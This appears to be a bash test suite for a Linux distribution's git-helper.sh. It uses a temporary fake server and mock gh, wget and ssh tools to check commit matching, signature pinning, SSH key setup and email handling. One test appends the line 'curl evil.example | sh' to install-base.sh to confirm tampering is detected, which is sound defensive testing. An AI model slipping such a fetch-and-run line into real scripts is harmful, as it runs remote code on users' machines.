#!/bin/bash
# Checks git-helper.sh with a pretend server (a bare repository in a temp
# folder, two commits of this checkout's files) and copies like a stick's:
# a copy of an older commit is set at that commit and told what is newer; the
# newest one is up to date; a copy whose files were changed is said to differ
# from everything published; a FAT stick's lost executable marks don't count;
# a pinned key refuses an unsigned server and leaves nothing behind. Changes
# nothing outside a temp folder. Run by test.sh, or:  bash tools/test-git-helper.sh
# shellcheck disable=SC2016  # the inner shells expand their own variables
HERE=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)
T=$(mktemp -d) || { echo "  FAIL  couldn't make a temp folder (is /tmp full?)"; exit 1; }
trap 'rm -rf "$T"' EXIT
fails=0
check() { # DESCRIPTION CONDITION-COMMAND...
    local what=$1
    shift
    if "$@" >/dev/null 2>&1; then printf '  ok    %s\n' "$what"; else printf '  FAIL  %s\n' "$what"; fails=$((fails + 1)); fi
}
export GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t HOME=$T/home
mkdir -p "$HOME"
git config --global user.name t
git config --global user.email t@t

# The server: this checkout's files, then one more commit; it points at itself
mkdir "$T/W"
(cd "$HERE" && git ls-files -co --exclude-standard | tar -cf - -T -) | tar -C "$T/W" -xf -
# (as before any key: this checkout may pin the real one by now)
sed -i -e "s|^WREN_GIT_URL=.*|WREN_GIT_URL=file://$T/O.git|" -e 's/^WREN_SIGNING_FPR=.*/WREN_SIGNING_FPR=/' "$T/W/pins.sh"
rm -f "$T/W/data/wren-signing-key.asc"
git -C "$T/W" init -q -b main && git -C "$T/W" add -A && git -C "$T/W" -c commit.gpgsign=false commit -q -m first
FIRST=$(git -C "$T/W" rev-parse HEAD)
echo "# newer" >>"$T/W/README.md"
git -C "$T/W" -c commit.gpgsign=false commit -q -am second
SECOND=$(git -C "$T/W" rev-parse HEAD)
git clone -q --bare "$T/W" "$T/O.git"
# stick COMMIT DIR: what an install stick holds of that commit (git archive)
stick() { rm -rf "$2"; mkdir -p "$2"; git -C "$T/W" archive "$1" | tar -C "$2" -xf -; }
# (its questions answered from a file: none, so each takes its default)
gi() { WREN_TEST_ANSWERS=/dev/null bash "$1/git-helper.sh" 2>&1; }

stick "$FIRST" "$T/a"
out=$(gi "$T/a")
check "a copy of an older published commit: set at exactly that commit" test "$(git -C "$T/a" rev-parse HEAD)" = "$FIRST"
check "...it says how many newer ones there are, and that update.sh brings them" bash -c 'grep -q "1 newer commits are published" <<<"$1" && grep -q "update.sh" <<<"$1"' _ "$out"
check "...it follows the server's main" test "$(git -C "$T/a" rev-parse --abbrev-ref '@{upstream}')" = origin/main
check "...and no file of it changed" bash -c '[ -z "$(git -C "$1" status --porcelain)" ]' _ "$T/a"
out=$(gi "$T/a")
check "run again: a checkout already, nothing to do" grep -q "a git checkout already" <<<"$out"

stick "$SECOND" "$T/b"
out=$(gi "$T/b")
check "a copy of the newest commit: up to date" bash -c '[ "$(git -C "$1" rev-parse HEAD)" = "$2" ] && grep -q "you are up to date" <<<"$3"' _ "$T/b" "$SECOND" "$out"

stick "$SECOND" "$T/c"
find "$T/c" -type f -exec chmod 0644 {} +
out=$(gi "$T/c")
check "a FAT stick's lost executable marks don't count: still that commit" test "$(git -C "$T/c" rev-parse HEAD)" = "$SECOND"
check "...and the marks are back" test -x "$T/c/update.sh"

stick "$FIRST" "$T/d"
echo 'curl evil.example | sh' >>"$T/d/install-base.sh"
out=$(gi "$T/d")
rc=$?
check "changed files: it says they aren't anything that was published, and fails" bash -c '[ "$1" -ne 0 ] && grep -q "aren.t exactly any commit that was published" <<<"$2"' _ "$rc" "$out"
check "...and git status shows what differs" bash -c 'git -C "$1" status --porcelain | grep -q install-base.sh' _ "$T/d"
check "...the changed file itself is left as it is (nothing is changed)" grep -q "evil.example" "$T/d/install-base.sh"

# With a signing key pinned, an unsigned server is refused
if command -v gpg >/dev/null; then
    mkdir -m 700 "$T/gh"
    gpg --homedir "$T/gh" --batch --quiet --passphrase '' --quick-gen-key "pinned <p@t>" ed25519 sign 1y 2>/dev/null
    F=$(gpg --homedir "$T/gh" --batch --with-colons --list-keys 2>/dev/null | awk -F: '/^fpr/ { print $10; exit }')
    stick "$SECOND" "$T/e"
    gpg --homedir "$T/gh" --batch --armor --export "$F" >"$T/e/data/wren-signing-key.asc" 2>/dev/null
    sed -i "s|^WREN_SIGNING_FPR=.*|WREN_SIGNING_FPR=$F|" "$T/e/pins.sh"
    out=$(gi "$T/e")
    rc=$?
    check "a pinned key and an unsigned server: refused, and nothing is left behind" bash -c '[ "$1" -ne 0 ] && grep -q "isn.t signed by Wren Linux.s key" <<<"$2" && [ ! -e "$3/.git" ]' _ "$rc" "$out" "$T/e"
    gpgconf --homedir "$T/gh" --kill all 2>/dev/null
fi

check "update.sh, in a copy that isn't a checkout yet, says to run git-helper.sh" bash -c '
    stick() { :; }; out=$(cd "$1" && bash update.sh 2>&1); grep -q "git-helper.sh" <<<"$out"' _ "$T/e"
# ---- your name and email, and how git logs in to push; never a push
L=$T/login
mkdir -p "$L"
stick "$SECOND" "$T/l"; gi "$T/l" >/dev/null
git -C "$T/l" remote set-url origin https://github.com/someone/wren-linux.git
# a pretend gh: logged in while $L/in exists; a pretend wget: GitHub's public
# profile of "someone" while $L/api exists. Both write down what they are asked.
cat >"$L/gh" <<EOF
#!/bin/sh
echo "gh \$*" >>"$L/calls"
case "\$1 \$2" in
    "auth status") [ -e "$L/in" ] ;;
    "auth login") : >"$L/in" ;;
    "auth logout") rm -f "$L/in" ;;
esac
EOF
cat >"$L/wget" <<EOF
#!/bin/sh
echo "wget \$*" >>"$L/calls"
[ -e "$L/api" ] || exit 4
printf '{\n  "login": "someone",\n  "id": 4242,\n  "node_id": "U_x",\n  "followers": 7\n}\n'
EOF
# a pretend ssh-keygen (makes the key files; -y -P '' works while $L/nopass exists) and ssh
# (GitHub knows the key while $L/on-github exists)
cat >"$L/ssh-keygen" <<EOF
#!/bin/bash
echo "ssh-keygen \$*" >>"$L/calls"
if [ "\$1" = -y ]; then [ -e "$L/nopass" ]; exit; fi
t=\$2 f=\${@: -1}
echo private >"\$f"
case \$t in ed25519-sk) echo "sk-ssh-ed25519@openssh.com AAAAGnNrLXNzaC1lZDI1NTE5QG9wZW5zc2guY29t wren-github" ;; *) echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKEYKEYKEY wren-github" ;; esac >"\$f.pub"
EOF
cat >"$L/ssh" <<EOF
#!/bin/sh
echo "ssh \$*" >>"$L/calls"
if [ -e "$L/on-github" ]; then echo "Hi someone/wren-linux! You've successfully authenticated, but GitHub does not provide shell access." >&2; exit 1; fi
echo "git@github.com: Permission denied (publickey)." >&2; exit 255
EOF
chmod +x "$L/gh" "$L/wget" "$L/ssh-keygen" "$L/ssh"
# li DIR ANSWER...: git-helper.sh (DIR "-": this copy, $T/l), answering in turn
li() {
    local d=$1
    shift
    : >"$L/calls"
    printf '%s\n' "$@" >"$L/answers"
    if [ "$d" = - ]; then
        WREN_GH=${GHP:-$L/gh} WREN_WGET=$L/wget WREN_SSH=$L/ssh WREN_SSH_KEYGEN=$L/ssh-keygen WREN_TEST_ANSWERS=$L/answers bash "$T/l/git-helper.sh" 2>&1
    else
        WREN_GH=${GHP:-$L/gh} WREN_WGET=$L/wget WREN_SSH=$L/ssh WREN_SSH_KEYGEN=$L/ssh-keygen WREN_TEST_ANSWERS=$L/answers bash "$T/l/git-helper.sh" "$d" 2>&1
    fi
}
helper() { git config --global --get-all "credential.https://$1.helper" | paste -sd'|'; }

pushurl() { git -C "$T/l" remote get-url --push origin; }
K=$HOME/.ssh/id_wren_github
mkdir -p "$HOME/.ssh"; printf 'Host example\n    User me\n' >"$HOME/.ssh/config"
# answers: your name and email kept (n), no no-reply address (n), then: a security key? added it?
out=$(li - n n n y)
check "ssh: a key of its own for GitHub, a key file (no security key)" bash -c '
    grep -q "ssh-keygen -t ed25519 -C wren-github -f $2" "$1" && [ -f "$2.pub" ]' _ "$L/calls" "$K"
check "...shown, with where to add it on GitHub" bash -c 'grep -q "AAAAC3NzaC1lZDI1NTE5AAAAIKEYKEYKEY" <<<"$1" && grep -q "SSH and GPG keys" <<<"$1"' _ "$out"
check "...GitHub doesn't know it yet: the push address is left alone, and it says so" bash -c '
    [ "$2" = https://github.com/someone/wren-linux.git ] && grep -q "didn.t take the key" <<<"$1"' _ "$out" "$(pushurl)"
check "...GitHub's host keys from pins.sh, in a file of their own" bash -c '. "$1/pins.sh"; [ "$(cat "$2")" = "$GITHUB_HOST_KEYS" ]' _ "$HERE" "$HOME/.ssh/known_hosts_github"
c=$HOME/.ssh/config
check "...a block at the top of ~/.ssh/config: this key only, no agent, the pinned keys, strictly" bash -c '
    [ "$(head -1 "$1")" = "# >>> Wren Linux github >>>" ] && grep -qx "    IdentityFile $2" "$1" && grep -qx "    IdentitiesOnly yes" "$1" &&
    grep -qx "    IdentityAgent none" "$1" && grep -qx "    StrictHostKeyChecking yes" "$1" && grep -qx "    UserKnownHostsFile $3" "$1"' _ "$c" "$K" "$HOME/.ssh/known_hosts_github"
check "...your own ssh settings kept below it, the file yours alone" bash -c 'tail -2 "$1" | grep -qx "Host example" && [ "$(stat -c %a "$1")" = 600 ]' _ "$c"
touch "$L/on-github"
out=$(li - n n y)
check "GitHub knows it: the key made before is used, and git pushes over ssh" bash -c '
    ! grep -q "ssh-keygen -t" "$2" && [ "$3" = git@github.com:someone/wren-linux.git ]' _ "$out" "$L/calls" "$(pushurl)"
check "...while it fetches from the public address as before (updates need no key)" test "$(git -C "$T/l" remote get-url origin)" = https://github.com/someone/wren-linux.git
out=$(li - n n)
check "run again: already set up, the block written once" bash -c 'grep -q "Already set up" <<<"$1" && [ "$(grep -c "^# >>> Wren Linux github" "$2")" = 1 ]' _ "$out" "$c"
git config --global credential.https://github.com.helper ''; git config --global credential.https://github.com.username someone
git config --global credential.helper store; : >"$L/in"
out=$(li - n n y y y)
check "...the https logins of before: removed, git's plain-text store stopped, gh logged out (y)" bash -c '
    ! git config --global --get-regexp "^credential\.https://github\.com\." && ! git config --global credential.helper && grep -qx "gh auth logout --hostname github.com" "$2"' _ "$out" "$L/calls"
rm -f "$K" "$K.pub"; git -C "$T/l" remote set-url --push origin https://github.com/someone/wren-linux.git
out=$(li - n n y y)
check "a security key plugged in (y): the key is made on it" grep -q "ssh-keygen -t ed25519-sk -C wren-github -f $K" "$L/calls"
check "...and no passphrase warning (the touch is what guards it)" bash -c '! grep -q "no passphrase" <<<"$1"' _ "$out"
rm -f "$K" "$K.pub"; touch "$L/nopass"; git -C "$T/l" remote set-url --push origin https://github.com/someone/wren-linux.git
out=$(li - n n n y)
check "a key file without a passphrase: a warning, and how to add one" bash -c 'grep -q "no passphrase" <<<"$1" && grep -q "ssh-keygen -p -f" <<<"$1"' _ "$out"
rm -f "$L/nopass" "$L/on-github"
check "no token is made, asked for or saved anywhere" bash -c '! grep -qiE "personal-access-tokens|credential\.helper.*cache|auth login" "$1"' _ "$HERE/git-helper.sh"

# The no-reply address: GitHub refuses pushes that carry an email kept private
echo "# mine" >>"$T/l/README.md"
git -C "$T/l" -c commit.gpgsign=false commit -q -am "not pushed yet"
: >"$L/api"
out=$(li - n y "" n)
check "no-reply: offered for GitHub, looked up from the public profile of the address's user" bash -c '
    grep -q "GH007" <<<"$1" && grep -qF "https://api.github.com/users/someone" "$2" &&
    [ "$(git config --global user.email)" = 4242+someone@users.noreply.github.com ]' _ "$out" "$L/calls"
check "...the commit not pushed yet with the old address: it says how to change it, empty ones too" bash -c '
    grep -q "1 commits not pushed yet still carry t@t" <<<"$1" && grep -q -- "--reset-author --allow-empty" <<<"$1"' _ "$out"
out=$(li - n n)
check "...with the no-reply address: not offered again" bash -c '! grep -q GH007 <<<"$1"' _ "$out"
git config --global user.email t@t
rm -f "$L/api"
out=$(li - n y "" n)
check "...offline: nothing changes, and it says where the address is" bash -c '
    [ "$(git config --global user.email)" = t@t ] && grep -q "settings/emails" <<<"$1"' _ "$out"
out=$(li - n y "not/a user" n)
check "...a name that isn't a GitHub user name: refused, nothing looked up" bash -c '
    grep -q "isn.t a GitHub user name" <<<"$1" && ! grep -q wget "$2"' _ "$out" "$L/calls"

# Your name and email, asked when they aren't set (Enter keeps what is set)
mv "$HOME/.gitconfig" "$T/gitconfig"
mkdir -p "$T/any"
git -C "$T/any" init -q
out=$(li "$T/any" "Jo Doe" "jo@example.org")
check "any repository: name and email asked when unset" bash -c '
    [ "$(git config --global user.name)" = "Jo Doe" ] && [ "$(git config --global user.email)" = jo@example.org ]'
check "...no server: no login to set, and nothing about GitHub" bash -c 'grep -q "has no server" <<<"$1" && ! grep -q GH007 <<<"$1"' _ "$out"
li "$T/any" y "" "jo2@example.org" >/dev/null
check "...changed when you say so; Enter keeps the name" bash -c '
    [ "$(git config --global user.name)" = "Jo Doe" ] && [ "$(git config --global user.email)" = jo2@example.org ]'
git -C "$T/any" remote add origin https://git.example.org:8443/me/x.git
out=$(li "$T/any/" n)
check "...a server that isn't GitHub: nothing set, no key made" bash -c '
    grep -q "isn.t on GitHub" <<<"$1" && ! grep -q ssh-keygen "$2" && ! git config --global --get-regexp "^credential\.https://git\.example"' _ "$out" "$L/calls"
out=$(li "$T/nothere")
check "...a folder that isn't a repository: refused" grep -q "isn't a git repository" <<<"$out"
mv "$T/gitconfig" "$HOME/.gitconfig"
check "it never pushes" bash -c '! grep -qE "(^|[[:space:]])(g|git( -C [^ ]+)?) push" "$1"' _ "$HERE/git-helper.sh"
check "the git extra asks no name, email or login during an install: it points to git-helper.sh" bash -c '
    ! grep -qE "user\.(name|email)|auth login" "$1/extras/git.sh" && grep -q "git-helper.sh" "$1/extras/git.sh" && ! grep -q WREN_GH_LOGIN "$1/install-base.sh"' _ "$HERE"
check "...and nothing of gh: not on its status line, and install-base.sh sets nothing up for it" bash -c '
    ! grep -q "apt:gh" "$1/extras/git.sh" && ! grep -q WREN_SETUP_GH "$1/install-base.sh"' _ "$HERE"
check "the README's way back to GitHub is git-helper.sh" grep -q 'bash ~/wren/git-helper.sh' "$HERE/README.md"

# ---- extras/git.sh: git only, nothing asked ----
# In a copy of Wren Linux with a pretend sudo: what apt would be given is written down
G=$T/gitx
mkdir -p "$G/r/extras" "$G/bin" "$G/home"
sed 's|^export PATH=.*|export PATH="$GIT_TEST_PATH"|' "$HERE/lib.sh" >"$G/r/lib.sh"
for f in pins.sh packages.sh lib data docs bin; do ln -s "$HERE/$f" "$G/r/$f"; done
cp "$HERE/extras/git.sh" "$G/r/extras/git.sh"
cat >"$G/bin/sudo" <<PRETEND
#!/bin/sh
echo "sudo \$*" >>"$G/calls"
case \$1 in -v | -n) exit 0 ;; esac
case "\$*" in *apt-get*install*.deb*) for f; do case \$f in *.deb) dpkg-deb -f "\$f" Depends >>"$G/depends" ;; esac; done ;; esac
exit 0
PRETEND
printf '#!/bin/sh\necho "deb.debian.org"\n' >"$G/bin/getent"
printf '#!/bin/sh\necho "gh $*" >>"%s/calls"\n' "$G" >"$G/bin/gh"
chmod +x "$G/bin/"*
gitx() { # ANSWER
    rm -f "$G/calls" "$G/depends"
    printf '%s\n' "$1" >"$G/answers"
    HOME=$G/home GIT_TEST_PATH="$G/bin:$PATH" WREN_SUDO=$G/bin/sudo WREN_TEST_ANSWERS=$G/answers bash "$G/r/extras/git.sh" </dev/null >"$G/out" 2>&1
}
gitx ''
check "the git extra: git only, no GitHub tool, nothing asked" bash -c '
    grep -qw git "$1" && ! grep -qw gh "$1" && ! grep -q "\[Y/n\]\|\[y/N\]" "$2"' _ "$G/depends" "$G/out"
check "...and it says where pushing over ssh is set up" grep -q 'wrenctl git' "$G/out"

[ "$fails" -eq 0 ]
